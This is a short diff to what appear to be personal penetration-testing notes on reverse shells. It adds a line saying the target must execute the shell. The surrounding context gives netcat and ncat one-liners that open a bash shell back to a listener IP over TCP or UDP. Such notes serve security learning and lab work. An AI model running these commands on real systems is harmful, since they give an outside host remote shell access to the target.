@@ -20,6 +20,7 @@ Listener:
 Target:  
 `netcat 10.0.2.4 4444 -e /bin/bash` or `nc -c bash 10.0.0.1 4444`  
 `-e` execute that program after connection -> that way you can send commends directly to opened shell via TCP connection (also possible with UDP `ncat --udp 10.0.0.1 4242 -e /bin/bash`)
+remember that the **target** has to execute shell (same goes with bind shell)
 
 Python tty (teletypewriter) wrapper:  
 ```bash
